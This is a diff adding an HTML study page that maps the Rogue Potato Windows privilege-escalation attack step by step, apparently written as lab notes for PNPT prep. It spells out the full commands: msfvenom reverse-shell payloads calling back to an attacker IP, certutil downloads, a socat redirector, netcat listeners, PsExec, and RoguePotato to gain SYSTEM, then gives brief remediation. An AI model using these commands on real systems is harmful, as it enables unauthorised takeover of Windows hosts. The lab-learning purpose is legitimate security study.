@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Rogue Potato Attack Map // Red</title>
+<style>
+  :root{
+    --bg:#0b1220; --panel:#111c2e; --panel2:#0f1829; --line:#1e2d44;
+    --teal:#2dd4bf; --teal-d:#0f766e; --purple:#a78bfa; --purple-d:#6b21a8;
+    --amber:#fbbf24; --red:#f87171; --green:#34d399; --code:#7fe3d4;
+    --txt:#e5edf5; --muted:#8aa0b8; --line2:#263a57;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{scroll-behavior:smooth}
+  body{background:var(--bg);color:var(--txt);font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;line-height:1.55;padding-bottom:60px}
+  .wrap{max-width:1040px;margin:0 auto;padding:0 16px}
+
+  header{padding:34px 0 18px;border-bottom:1px solid var(--line);margin-bottom:22px;
+    background:radial-gradient(900px 300px at 15% -40%, rgba(45,212,191,.12), transparent),
+               radial-gradient(700px 260px at 95% -60%, rgba(167,139,250,.13), transparent)}
+  h1{font-size:29px;font-weight:800;letter-spacing:.3px;line-height:1.15}
+  h1 .by{color:var(--teal);font-weight:600}
+  .tag{display:inline-block;margin-top:5px;color:var(--purple);font-family:ui-monospace,Menlo,Consolas,monospace;font-size:13px}
+  .sub{color:var(--muted);margin-top:12px;max-width:760px;font-size:15px}
+
+  h2{font-size:19px;font-weight:700;margin:30px 0 12px;display:flex;align-items:center;gap:9px}
+  h2 .n{background:var(--purple-d);color:#fff;font-size:13px;width:24px;height:24px;border-radius:7px;display:inline-flex;align-items:center;justify-content:center;font-weight:700}
+
+  .concept{background:var(--panel);border:1px solid var(--line);border-left:3px solid var(--teal-d);border-radius:12px;padding:16px 18px;font-size:15px;color:#cdd9e5}
+  .concept b{color:var(--teal)}
+
+  /* flow diagram */
+  .flow{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:6px}
+  @media(max-width:720px){.flow{grid-template-columns:1fr}}
+  .col{background:var(--panel2);border:1px solid var(--line);border-radius:14px;padding:14px}
+  .col h3{font-size:14px;text-transform:uppercase;letter-spacing:.6px;margin-bottom:12px;font-weight:700}
+  .col.kali h3{color:var(--teal)} .col.win h3{color:var(--purple)}
+  .node{background:var(--panel);border:1px solid var(--line2);border-radius:10px;padding:9px 12px;margin-bottom:9px;font-size:13.5px}
+  .node .t{font-weight:700;display:block;margin-bottom:2px}
+  .node .d{color:var(--muted);font-size:12.5px}
+  .node.sys{border-color:var(--teal-d);box-shadow:0 0 0 1px rgba(45,212,191,.2) inset}
+  .node.svc{border-color:var(--purple-d)}
+  .conn{font-family:ui-monospace,monospace;font-size:12px;color:var(--amber);margin:2px 0 10px 4px}
+
+  /* steps */
+  .step{background:var(--panel);border:1px solid var(--line);border-radius:12px;margin-bottom:11px;overflow:hidden;transition:.18s}
+  .step:hover{border-color:var(--teal-d)}
+  .step .head{padding:14px 16px;cursor:pointer;display:flex;align-items:center;gap:12px}
+  .step .num{flex-shrink:0;width:26px;height:26px;border-radius:8px;background:var(--teal-d);color:#fff;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:14px}
+  .step .ttl{font-weight:700;font-size:15px}
+  .step .where{font-family:ui-monospace,monospace;font-size:11px;padding:2px 7px;border-radius:5px;margin-left:auto;flex-shrink:0}
+  .where.kali{color:var(--teal);background:rgba(45,212,191,.1);border:1px solid var(--teal-d)}
+  .where.win{color:var(--purple);background:rgba(167,139,250,.1);border:1px solid var(--purple-d)}
+  .step .plus{color:var(--teal);font-size:19px;margin-left:10px;transition:.2s;flex-shrink:0}
+  .step.open .plus{transform:rotate(45deg)}
+  .step .body{max-height:0;overflow:hidden;transition:max-height .35s ease}
+  .step.open .body{max-height:1200px}
+  .step .inner{padding:0 16px 16px;border-top:1px solid var(--line)}
+  pre{background:#07101d;border:1px solid var(--line);border-left:3px solid var(--teal-d);border-radius:8px;padding:11px 13px;overflow-x:auto;margin:12px 0 8px}
+  code{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12.5px;color:var(--code);white-space:pre}
+  table{width:100%;border-collapse:collapse;margin-top:8px;font-size:13px}
+  th,td{text-align:left;padding:6px 9px;border:1px solid var(--line2);vertical-align:top}
+  th{background:var(--teal-d);color:#fff;font-weight:600}
+  td:first-child{font-family:ui-monospace,monospace;color:var(--teal);white-space:nowrap}
+  .what{margin-top:10px;font-size:13.5px;color:#cdd9e5}
+  .what b{color:var(--green)}
+
+  .callout{border-radius:10px;padding:12px 15px;margin:10px 0;font-size:14px;border:1px solid}
+  .c-key{background:rgba(251,191,36,.08);border-color:#92400e;color:#fcd9a0}
+  .c-key b{color:var(--amber)}
+  .c-rem{background:rgba(52,211,153,.07);border-color:#166534;color:#b6f0d4}
+  .c-rem b{color:var(--green)}
+
+  footer{margin-top:40px;border-top:1px solid var(--line);padding-top:22px;color:var(--muted);font-size:13px}
+  footer a{color:var(--teal)}
+</style>
+</head>
+<body>
+<header>
+  <div class="wrap">
+    <h1>Rogue Potato <span class="by">// Token Impersonation · Red</span></h1>
+    <div class="tag">local service (SeImpersonate) &rarr; nt authority\system</div>
+    <p class="sub">A step-by-step map of the Rogue Potato privilege-escalation attack &mdash; the one that turns a service account into SYSTEM by stealing SYSTEM's own token. The fiddliest attack in the Windows PrivEsc room, laid out piece by piece. Generic methodology from a public lab &mdash; nothing about the real PNPT exam (NDA).</p>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <h2><span class="n">i</span> The idea</h2>
+  <div class="concept">
+    Some accounts hold <b>SeImpersonatePrivilege</b> &mdash; a &ldquo;badge&rdquo; that lets a process <b>wear the security token of anything that authenticates to it</b>. It is usually held by <b>service accounts</b> (local service, network service, IIS, SQL), not normal users. Rogue Potato <b>tricks a SYSTEM process into authenticating to you</b>, then puts on its SYSTEM token &mdash; so you climb <b>up</b> to SYSTEM. The trigger to remember: <code style="color:var(--code)">whoami /priv</code> shows <b>SeImpersonatePrivilege</b> &rarr; &ldquo;Potato &rarr; SYSTEM.&rdquo;
+  </div>
+
+  <h2><span class="n">ii</span> The flow</h2>
+  <div class="flow">
+    <div class="col kali">
+      <h3>🐉 Kali (attacker)</h3>
+      <div class="node"><span class="t">socat redirector</span><span class="d">listens on :135, forwards to target :9999 &mdash; the bridge the fake OXID resolver needs</span></div>
+      <div class="conn">&darr; OXID redirect (135 &rarr; 9999)</div>
+      <div class="node"><span class="t">nc :4444</span><span class="d">catches the local-service shell</span></div>
+      <div class="node sys"><span class="t">nc :5555</span><span class="d">catches the SYSTEM shell 👑</span></div>
+    </div>
+    <div class="col win">
+      <h3>🪟 Target (victim)</h3>
+      <div class="node"><span class="t">Elevated admin cmd</span><span class="d">high-integrity prompt (Run as administrator)</span></div>
+      <div class="conn">&darr; PsExec64 -u "local service"</div>
+      <div class="node svc"><span class="t">local service shell</span><span class="d">holds SeImpersonatePrivilege &mdash; reverse.exe &rarr; Kali:4444</span></div>
+      <div class="conn">&darr; run RoguePotato.exe from here</div>
+      <div class="node sys"><span class="t">SYSTEM shell</span><span class="d">reverse2.exe launched with SYSTEM token &rarr; Kali:5555 👑</span></div>
+    </div>
+  </div>
+  <div class="callout c-key" style="margin-top:14px"><b>Why socat?</b> RoguePotato needs an OXID resolver on <b>port 135</b>, but you can't easily listen there on the target. So the exploit points at <b>your Kali on 135</b>, and socat forwards that to <b>port 9999</b> on the target where RoguePotato is really listening. That's the whole redirect trick.</div>
+  <div class="callout c-key"><b>Why two ports?</b> The local-service shell and the SYSTEM shell are <b>two separate shells</b> &mdash; each needs its own listener on its own port (<b>4444</b> and <b>5555</b>), or they collide. So you build two payloads: reverse.exe (4444) and reverse2.exe (5555).</div>
+
+  <h2><span class="n">iii</span> The steps <span style="font-size:13px;font-weight:400;color:var(--muted)">(click to expand)</span></h2>
+  <div id="steps"></div>
+
+  <h2><span class="n">iv</span> Remediation</h2>
+  <div class="callout c-rem"><b>Remove SeImpersonate</b> from service accounts where it isn't needed. Keep Windows <b>patched</b> (the OXID/DCOM coercion tricks get fixed over time). Run services under <b>least-privilege</b> identities, and watch for the Potato tool family on endpoints.</div>
+
+  <footer>
+    <div>Built by <b>Red</b> as part of my PNPT prep &mdash; from running the lab myself. Built with AI assistance for formatting and this interactive map.</div>
+    <div style="margin-top:8px">Licensed <b>CC BY-NC 4.0</b> &mdash; free to use and share with credit, not for sale. · See also the <a href="windows-privesc-map.html">Windows PrivEsc Attack Map</a>.</div>
+  </footer>
+</div>
+
+<script>
+const STEPS = [
+  {w:"kali", ttl:"Build two payloads",
+   cmd:"msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe -o reverse.exe\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=5555 -f exe -o reverse2.exe",
+   rows:[["-p windows/x64/shell_reverse_tcp","64-bit Windows reverse shell"],["LHOST=KALI_IP","your Kali IP (the shell calls back here)"],["LPORT 4444 / 5555","4444 = local-service shell · 5555 = SYSTEM shell"],["-f exe -o","output as a Windows .exe with that name"]],
+   what:"<b>reverse.exe</b> is for the local-service shell; <b>reverse2.exe</b> is the one RoguePotato will launch as SYSTEM. Two shells, two ports."},
+
+  {w:"win", ttl:"Transfer both payloads to the target",
+   cmd:"# Kali:\npython3 -m http.server 80\n# Windows (elevated cmd):\ncertutil -urlcache -split -f http://KALI_IP/reverse.exe  C:\\PrivEsc\\reverse.exe\ncertutil -urlcache -split -f http://KALI_IP/reverse2.exe C:\\PrivEsc\\reverse2.exe",
+   rows:[["python3 -m http.server 80","Kali serves the files on port 80"],["certutil -urlcache -split -f","Windows downloads a file (-f = force overwrite)"],["http://KALI_IP/...","where to get it (URL, forward slashes)"],["C:\\PrivEsc\\...","where to save it (Windows path, backslashes)"]],
+   what:"Both payloads must sit at <b>C:\\PrivEsc\\</b> on the target before you fire."},
+
+  {w:"win", ttl:"Get an ELEVATED admin prompt",
+   cmd:"# Kali: xfreerdp /u:admin /p:PASSWORD /cert:ignore /v:TARGET_IP\n# Windows: right-click Command Prompt -> Run as administrator",
+   rows:[["xfreerdp /u:admin","RDP in as the admin user (Kali tool)"],["Run as administrator","gives a HIGH-integrity prompt (title says 'Administrator:')"]],
+   what:"<b>High integrity matters:</b> a normal admin cmd is medium-integrity and can't launch a service. PsExec (next) needs the elevated one."},
+
+  {w:"kali", ttl:"Start the socat redirector",
+   cmd:"sudo socat tcp-listen:135,reuseaddr,fork tcp:TARGET_IP:9999",
+   rows:[["tcp-listen:135","listen on Kali port 135 (the OXID resolver port)"],["reuseaddr,fork","reuse the port, handle multiple connections"],["tcp:TARGET_IP:9999","forward everything to the target's port 9999"]],
+   what:"This is the bridge: SYSTEM is tricked into hitting <b>Kali:135</b>, socat forwards to <b>target:9999</b> where RoguePotato listens."},
+
+  {w:"kali", ttl:"Start both listeners",
+   cmd:"nc -nvlp 4444      # local-service shell\nnc -nvlp 5555      # SYSTEM shell",
+   rows:[["nc -nvlp","netcat listener: -n no DNS, -v verbose, -l listen, -p port"],["4444","catches the local-service shell"],["5555","catches the SYSTEM shell"]],
+   what:"Two terminals, one per shell. Leave them alone once a shell lands &mdash; <b>Ctrl+C hangs up your shell.</b>"},
+
+  {w:"win", ttl:"Get the local-service shell (PsExec)",
+   cmd:'C:\\PrivEsc\\PSExec64.exe -accepteula -i -u "nt authority\\local service" C:\\PrivEsc\\reverse.exe',
+   rows:[["PSExec64.exe","run a program as another account (full path)"],["-accepteula -i","accept licence · interactive"],['-u "nt authority\\local service"','run AS the local-service account (holds SeImpersonate)'],["C:\\PrivEsc\\reverse.exe","the 4444 payload to launch"]],
+   what:"reverse.exe runs as local service &rarr; lands in <b>nc 4444</b>. Confirm: <code style='color:var(--code)'>whoami</code> = nt authority\\local service, and <code style='color:var(--code)'>whoami /priv</code> shows <b>SeImpersonatePrivilege = Enabled</b> &mdash; the green light."},
+
+  {w:"win", ttl:"Run RoguePotato -> SYSTEM",
+   cmd:'C:\\PrivEsc\\RoguePotato.exe -r KALI_IP -e "C:\\PrivEsc\\reverse2.exe" -l 9999',
+   rows:[["-r KALI_IP","the rogue OXID resolver = your Kali IP (where socat listens on 135)"],["-e C:\\PrivEsc\\reverse2.exe","the executable to run as SYSTEM = the 5555 payload"],["-l 9999","the local port RoguePotato listens on (socat forwards here)"]],
+   what:"Run this <b>from the local-service shell</b>. RoguePotato coerces SYSTEM, wears its token, runs reverse2.exe as SYSTEM &rarr; lands in <b>nc 5555</b>. Look for <b>'Got SYSTEM Token!!!'</b> &rarr; <code style='color:var(--code)'>whoami</code> = <b>nt authority\\system</b> 👑"},
+];
+
+const steps = document.getElementById('steps');
+const esc = s => s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+STEPS.forEach((s,i)=>{
+  const el=document.createElement('div');
+  el.className='step';
+  el.innerHTML=`
+    <div class="head">
+      <span class="num">${i+1}</span>
+      <span class="ttl">${s.ttl}</span>
+      <span class="where ${s.w}">${s.w==='kali'?'🐉 Kali':'🪟 Target'}</span>
+      <span class="plus">+</span>
+    </div>
+    <div class="body"><div class="inner">
+      <pre><code>${esc(s.cmd)}</code></pre>
+      <table><tr><th>Part</th><th>What it means</th></tr>
+        ${s.rows.map(r=>`<tr><td>${esc(r[0])}</td><td>${r[1]}</td></tr>`).join('')}
+      </table>
+      <div class="what">${s.what}</div>
+    </div></div>`;
+  el.querySelector('.head').addEventListener('click',()=>el.classList.toggle('open'));
+  steps.appendChild(el);
+});
+// open the first step by default
+steps.firstChild.classList.add('open');
+</script>
+</body>
+</html>
